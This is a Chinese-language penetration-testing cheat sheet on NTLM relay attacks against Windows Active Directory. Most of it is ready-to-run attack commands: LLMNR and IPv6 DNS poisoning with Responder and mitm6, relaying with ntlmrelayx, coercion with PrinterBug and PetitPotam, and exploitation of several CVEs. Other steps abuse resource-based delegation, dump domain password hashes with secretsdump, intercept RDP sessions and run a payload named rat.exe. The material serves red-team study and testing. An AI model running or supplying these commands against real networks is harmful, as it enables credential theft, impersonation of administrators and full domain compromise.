# 内网 - NTLM 中继 (NTLM Relay)

NTLMv1 和 NTLMv2 可以被中继以连接到另一台机器。

| Hash                  | Hashcat | 攻击方法                 |
|-----------------------|---------|--------------------------|
| LM                    | `3000`  | 破解/哈希传递 (pass the hash) |
| NTLM/NTHash           | `1000`  | 破解/哈希传递 (pass the hash) |
| NTLMv1/Net-NTLMv1     | `5500`  | 破解/中继攻击 (relay attack)  |
| NTLMv2/Net-NTLMv2     | `5600`  | 破解/中继攻击 (relay attack)  |

使用 `hashcat` 破解哈希。

```powershell
hashcat -m 5600 -a 0 hash.txt crackstation.txt
```

## MS08-068 NTLM 反射 (NTLM reflection)

SMB 协议中的 NTLM 反射漏洞。仅针对 Windows 2000 到 Windows Server 2008。

> 此漏洞允许攻击者将传入的 SMB 连接重定向回其来源的机器，然后使用受害者自己的凭据访问受害机器。

* <https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068>

```powershell
msf > use exploit/windows/smb/smb_relay
msf exploit(smb_relay) > show targets
```

## 不需要 LDAP 签名且禁用 LDAP 通道绑定

在安全评估期间，有时我们没有任何帐户来执行审计。因此我们通过执行 NTLM 中继攻击将自己注入到 Active Directory 中。该技术需要满足三个要求：

* 不需要 LDAP 签名（默认设置为 `Not required`）
* 禁用 LDAP 通道绑定。（默认禁用）
* 对于被中继的帐户，`ms-DS-MachineAccountQuota` 至少需要为 1（默认值为 10）

然后，我们可以使用一个工具（如 `Responder`）对网络上的 `LLMNR`、`MDNS` 和 `NETBIOS` 请求进行投毒，并使用 `ntlmrelayx` 添加我们的计算机。

```bash
# 在第一个终端中
sudo ./Responder.py -I eth0 -wfrd -P -v

# 在第二个终端中
sudo python ./ntlmrelayx.py -t ldaps://IP_DC --add-computer
```

这里需要中继到通过 TLS 的 LDAP (LDAPS)，因为不允许通过未加密的连接创建帐户。

## 禁用 SMB 签名且使用 IPv4

如果一台机器的 SMB 签名 (`SMB signing`) 为禁用 (`disabled`)，则可以使用 Responder 和 Multirelay.py 脚本执行 `NTLMv2 哈希中继` 并获取该机器上的 shell 访问权限。也称为 **LLMNR/NBNS 投毒 (Poisoning)**

1. 打开 Responder.conf 文件，并将 `SMB` 和 `HTTP` 的值设置为 `Off`。

    ```powershell
    [Responder Core]
    ; Servers to start
    ...
    SMB = Off     # 关闭它
    HTTP = Off    # 关闭它
    ```

2. 运行 `python RunFinger.py -i IP_Range` 以检测 `SMB signing`:`disabled` 的机器。
3. 运行 `python Responder.py -I <interface_card>`
4. 使用中继工具，例如 `ntlmrelayx` 或 `MultiRelay`
    * `impacket-ntlmrelayx -tf targets.txt` 用于转储列表中目标的 SAM 数据库。
    * `python MultiRelay.py -t <target_machine_IP> -u ALL`
5. ntlmrelayx 还可以充当 SOCK 代理，代理所有受感染的会话。

    ```powershell
    $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
    [*] Servers started, waiting for connections
    Type help for list of commands
    ntlmrelayx> socks
    Protocol  Target          Username                  Port
    --------  --------------  ------------------------  ----
    MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
    SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
    MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433

    # 你可能需要使用 "-t" 指定特定的目标
    # smb://, mssql://, http://, https://, imap://, imaps://, ldap://, ldaps:// 以及 smtp://
    impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
    impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support

    # 然后可以将 socks 代理与 Impacket 工具或 netexec 一起使用
    $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
    $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
    $ proxychains netexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
    ```

**缓解措施 (Mitigations)**:

* 通过组策略禁用 LLMNR

    ```powershell
    打开 gpedit.msc 并导航到 计算机配置 > 管理模板 > 网络 > DNS 客户端 > 关闭多播名称解析并设置为已启用
    ```

* 禁用 NBT-NS

    ```powershell
    这可以通过 GUI 导航到 网卡 > 属性 > IPv4 > 高级 > WINS 然后在 "NetBIOS 设置" 下选择 禁用 TCP/IP 上的 NetBIOS 来实现
    ```

## 禁用 SMB 签名且使用 IPv6

自 [MS16-077](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-077) 以来，不再通过广播协议请求 WPAD 文件的位置，而仅通过 DNS 请求。

```powershell
netexec smb $hosts --gen-relay-list relay.txt

# 通过 IPv6 进行 DNS 接管，mitm6 将通过 DHCPv6 请求 IPv6 地址
# -d 是过滤查询请求的域名 - 即受攻击的域
# -i 是让 mitm6 监听事件的接口
mitm6 -i eth0 -d $domain

# 欺骗 WPAD 并中继 NTLM 凭据
impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug

# -ip 是你希望中继运行的接口
# -wh 用于 WPAD 主机，指定你要提供的 wpad 文件
# -t 是你想要中继到的目标。 
impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2
```

## Drop the MIC - CVE-2019-1040

> CVE-2019-1040 漏洞使得可以修改 NTLM 身份验证数据包，而不会使身份验证失效，从而使攻击者能够移除防止从 SMB 中继到 LDAP 的标志

使用 [cve-2019-1040-scanner](https://github.com/fox-it/cve-2019-1040-scanner) 检查漏洞

```powershell
python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected)
```

* 使用任何 AD 帐户，通过 SMB 连接到处于漏洞影响下的 Exchange 服务器，并触发 SpoolService 错误。攻击者服务器将通过 SMB 连接回你，这可以使用修改版 ntlmrelayx 中继到 LDAP。使用中继的 LDAP 身份验证，将被控攻击帐户获取 DCSync 权限。攻击者帐户现在可以利用 DCSync 转储 AD 中的所有密码哈希

    ```powershell
    TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname>
    TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support
    TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
    ```

* 使用任何 AD 帐户，通过 SMB 连接到受害服务器，并触发 SpoolService 错误。攻击者服务器将通过 SMB 连接回你，这可以使用修改版 ntlmrelayx 中继到 LDAP。使用中继的 LDAP 身份验证，将被控攻击机器的基于资源的约束委派 (Resource Based Constrained Delegation) 权限授予具有控制权的机器账户访问受害服务器。攻击者现在可以作为受害服务器上的任何用户进行身份验证。

    ```powershell
    # 创建一个新的机器帐户
    TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
    TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
    TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME

    # 使用票据进行连接
    export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
    secretsdump.py -k -no-pass second-dc-server.local -just-dc
    ```

## Drop the MIC 2 - CVE-2019-1166

> 当中间人攻击者能够成功绕过 NTLM MIC（消息完整性检查）保护时，Microsoft Windows 中存在篡改漏洞。成功利用此漏洞的攻击者可以获得降级 NTLM 安全功能的权限。要利用此漏洞，攻击者需要篡改 NTLM 交换过程。攻击者随后可以修改 NTLM 数据包的标志，而不会使签名失效。

* 取消设置 `NTLM_NEGOTIATE` 消息中的签名标志（`NTLMSSP_NEGOTIATE_ALWAYS_SIGN`、`NTLMSSP_NEGOTIATE_SIGN`）
* 在 `NTLM_CHALLENGE` 消息中注入值为零的恶意 msvAvFlag 字段
* 从 `NTLM_AUTHENTICATE` 消息中移除 MIC
* 取消设置 `NTLM_AUTHENTICATE` 消息中的以下标志：`NTLMSSP_NEGOTIATE_ALWAYS_SIGN`、`NTLMSSP_NEGOTIATE_SIGN`、`NEGOTIATE_KEY_EXCHANGE`、`NEGOTIATE_VERSION`。

```ps1
ntlmrelayx.py -t ldap://dc.domain.com --escalate-user 'youruser$' -smb2support --remove-mic --delegate-access
```

## Ghost Potato - CVE-2019-1384

要求：

* 用户必须是本地 Administrators 组的成员
* 用户必须是 Backup Operators 组的成员
* 令牌必须被提升 (elevated)

使用修改版本的 ntlmrelayx：<https://shenaniganslabs.io/files/impacket-ghostpotato.zip>

```powershell
ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
```

## RemotePotato0 DCOM DCE RPC 中继 

> 它滥用 DCOM 激活服务并触发目标机器中当前登录用户的 NTLM 身份验证

要求：

* 位于会话 (session) 0 中的 shell（例如 WinRm shell 或 SSH shell）
* 特权用户已在会话 (session) 1 中登录（例如 Domain Admin 域管用户）

```powershell
# https://github.com/antonioCoco/RemotePotato0/
Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # 对于 Windows Server <= 2016，可以省略
Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```

## DNS 投毒 - 使用 mitm6 进行中继委派 

要求：

* 启用 IPv6（Windows 优先选择 IPv6 而不是 IPv4）
* 基于 TLS 的 LDAP (LDAPS)

> ntlmrelayx 将捕获的凭据中继到域控制器上的 LDAP，使用它创建一个新的机器帐户，打印该帐户的名称和密码并修改其委派权限。

```powershell
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
# -d: 过滤响应域的名称（遭受攻击的域）
# -i: mitm6 监听事件的接口
# -hw: 主机白名单

ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
# -ip: 您想要运行中继的接口
# -wh: WPAD 主机，指定为您提供的 wpad 文件
# -t: 您希望中继到的目标机器

# 现在授予委派权限，然后执行 RBCD 
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
export KRB5CCNAME=administrator.ccache  
secretsdump.py -k -no-pass target.lab.local  
```

## NTLM 反射 (NTLM Reflection) - CVE-2025-33073

* 为 `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 添加一个 DNS 记录，指向我们的 IP 地址。也可以通过注册 `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 来控制任何受漏洞影响的机器。

    ```ps1
    dnstool.py -u 'domain.local\username' -p 'P@ssw0rd' 10.10.10.10 -a add -r target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 198.51.100.27
    # OR (或)
    pretender -i "vmnet2" --spoof "target1UWhR..." --no-dhcp --no-timestamps
    ```

* 启动中继以捕获来自 TARGET 的回连回调。

    ```ps1
    ntlmrelayx.py -t smb://TARGET.domain.local -smb2support
    ntlmrelayx.py -t smb://TARGET.domain.local -smb2support -c 'type C:\Users\Administrator\Desktop\flag.txt'
    ```

* 使用 PetitPotam 触发从服务器到 `[SERVERNAME] + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` 的回连。

    ```ps1
    nxc smb TARGET.domain.local -u username -p 'P@ssw0rd' -M coerce_plus -o M=Petitpotam LISTENER=target1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
    # OR (或)
    petitpotam.py -d domain.local -u username -p 'password' "TARGET1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "TARGET.DOMAIN.LOCAL"
    ```

## 使用 WebDav 技巧进行中继 (Relaying with WebDav Trick)

> 利用示例：您可以强制机器帐户向你的主机进行身份验证，并将其与基于资源的约束委派 (RBCD) 结合以获取提升的访问权限。它允许攻击者诱发通过 HTTP 而非 SMB 建立身份验证

**要求**:

* WebClient 服务

**利用**:

* 发现网络上启用了 WebClient 服务的机器

    ```ps1
    webclientservicescanner 'domain.local'/'user':'password'@'machine'
    netexec smb 10.10.10.10 -d 'domain' -u 'user' -p 'password' -M webdav
    GetWebDAVStatus.exe 'machine'
    ```

* 在 Responder 中禁用 HTTP

    ```ps1
    sudo vi /usr/share/responder/Responder.conf
    ```

* 生成一个 Windows 机器名称，例如："WIN-UBNW4FI3AP0"

    ```ps1
    sudo responder -I eth0
    ```

* 为针对 DC 的 RBCD 操作做准备

    ```ps1
    python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support
    ```

* 触发身份验证以中继到我们的 nltmrelayx：`PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.10.10.10`，监听器主机必须指定完整的 FQDN 或者是完整的 netbios 机器名称，如 `logger.domain.local@80/test.txt`。直接指定 IP 可能导致匿名身份验证而不是 System 级身份验证。

  ```ps1
  # PrinterBug
  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  SpoolSample.exe "TARGET_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

  # PetitPotam
  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "TARGET_IP"
  ```

* 使用被创建配置的帐户请求服务票据：

    ```ps1
    .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
    .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
    ls \\PC1.purple.lab\c$
    # PC1的 IP: 10.0.0.4
    ```

之前利用方法的一个替代方案是，首先自己为攻击机器注册一个 **DNS 条目**，然后再进行强制触发身份验证。

```ps1
python3 /opt/krbrelayx/dnstool.py -u lab.lan\\jdoe -p 'P@ssw0rd' -r attacker.lab.lan -a add -d 192.168.1.50 192.168.1.2
python3 /opt/PetitPotam.py -u jdoe -p 'P@ssw0rd' -d lab.lan attacker@80/test 192.168.1.3
```

## 使用 pyrdp-mitm 的中间人 RDP 连接 (Man-in-the-middle RDP connections)

* [GoSecure/pyrdp](https://github.com/GoSecure/pyrdp)
* [RDP Man-in-the-Middle – Smile! You’re on Camera](https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera)

**用法 (Usage)**

```sh
pyrdp-mitm.py <IP>
pyrdp-mitp.py <IP>:<PORT> # 具有自定义端口
pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # 使用自定义的密钥及证书
```

**利用 (Exploitation)**

* 如果启用了网络级别身份验证 (NLA)，你将获得客户端的 NetNTLMv2 挑战/响应 (challenge)
* 如果禁用了 NLA，您将获得明文密码
* 其他功能也是可用的，例如击键记录

**替代方案 (Alternatives)**

* [SySS-Research/Seth](https://github.com/SySS-Research/Seth)，在启动 RDP 监听器之前优先执行 ARP 欺骗和劫持

## 将 IIS AppPool 伪造中继给本地管理员

* 从被攻击的机器发出 HTTP 强制请求

    ```ps1
    powershell iwr http://10.10.10.2 -UseDefaultCredentials 
    ```

* 将其身份验证中继转发到 LDAP

    ```ps1
    ntlmrelayx -t ldap://10.10.10.1 -smb2support --interactive
    ```

* 通过 TCP 连接到交互式的 LDAP shell

    ```ps1
    nc 127.0.0.1 <PORT>
    ```

* 开启 TLS 并执行 RBCD 资源委派相关的操作

    ```ps1
    start_tls
    add_computer fakePC P@ssword123
    set_rbcd TARGET$ fakePC$
    ```

* 对管理员身份进行模拟

    ```ps1
    getST.py -spn 'cifs/target.lab.local' -impersonate Administrator -dc-ip 'dc.lab.local' 'lab.local/fakePC$:P@ssword123'
    export KRB5CCNAME=/tmp/Administrator@cifs_target.lab.local@LAB.LOCAL.ccache
    wmiexec.py -k -no-pass @target.lab.local
    ```

## 转发和劫持端口 445 的常见问题 (Common Issues Forwarding Port 445)

默认情况下，SMB 服务绑定并监听于 445 端口，此设置会阻止任何尝试对该端口的操作进行监听和中继。

**技术 #1**：利用驱动程序将 Windows 系统里的端口 445 进重定向和转发

* [praetorian-inc/PortBender](https://github.com/praetorian-inc/PortBender) - TCP 端口重定向实用程序

    ```ps1
    rportfwd 8445 127.0.0.1 445 # 机器 8445 被重定向到 Teamserver 445
    sudo proxychains python3 examples/ntlmrelayx.py -t smb://10.10.10.10 -smb2support # 将 SMB 中继发至 10.10.10.10

    upload WinDivert32.sys
    upload WinDivert64.sys

    PortBender redirect 445 8445 # 在机器上把端口 445 重定向到 8445
    ```

**技术 #2**：彻底禁用 SMB 服务，以便轻松绑定和转发端口 445

* [zyn3rgy/smbtakeover](https://github.com/zyn3rgy/smbtakeover) - 通过服务控制管理器 (SCM) 交互在 Windows 系统上解除占用 445/tcp 端口技术的纯 Python3 / BOF 服务实现

    ```ps1
    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 check
    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 stop
    python3 smbtakeover.py atlas.lab/josh:password1@10.0.0.21 start

    bof_smbtakeover localhost check
    bof_smbtakeover 10.0.0.21 stop
    bof_smbtakeover localhost start

    rportfwd_local 445 127.0.0.1 445
    ```

* [Windows/sc.exe](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/sc-config)

    ```ps1
    sc config LanmanServer start= disabled
    sc stop LanmanServer
    sc stop srv2
    sc stop srvnet
    ```

* [XiaoliChan/wmiexec-Pro](https://github.com/XiaoliChan/wmiexec-Pro)

    ```ps1
    wmiexec-pro.py lab.local/admin@target.lab.local service -action disable -service-name "LanmanServer"
    wmiexec-pro.py lab.local/admin@target.lab.local service -action stop -service-name "LanmanServer"
    wmiexec-pro.py lab.local/admin@target.lab.local service -action stop -service-name "srv2"
    wmiexec-pro.py lab.local/admin@target.lab.local service -action disable -service-name "srvnet"
    wmiexec-pro.py lab.local/admin@target.lab.local service -action getinfo -service-name "srvnet"
    ```

## 参考资料 (References)

* [Abusing multicast poisoning for pre-authenticated Kerberos relay over HTTP with Responder and krbrelayx - Quentin Roland - 2025年1月27日](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
* [Drop the MIC - CVE-2019-1040 - Marina Simakov - 2019年6月11日](https://blog.preempt.com/drop-the-mic)
* [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema - 2019年6月13日](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
* [Lateral Movement – WebClient - 2021年10月20日](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
* [NTLM reflection is dead, long live NTLM reflection! – An in-depth analysis of CVE-2025-33073 - Wilfried Bécard and Guillaume André - 2025年6月11日](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
* [NTLM Relaying to LDAP - The Hail Mary of Network Compromise - @logangoins - 2024年7月23日](https://logan-goins.com/2024-07-23-ldap-relay/)
* [Playing with Relayed Credentials - 2018年6月27日](https://www.secureauth.com/blog/playing-relayed-credentials)
* [Relay Your Heart Away - An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - 2024年8月1日](https://posts.specterops.io/relay-your-heart-away-an-opsec-conscious-approach-to-445-takeover-1c9b4666c8ac)
* [Relay Your Heart Away: An OPSEC-Conscious Approach to 445 Takeover - Nick Powers (@zyn3rgy) - 2024年7月27日](https://www.youtube.com/watch?v=iBqOOkQGJEA)
* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher - 2018年3月9日](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
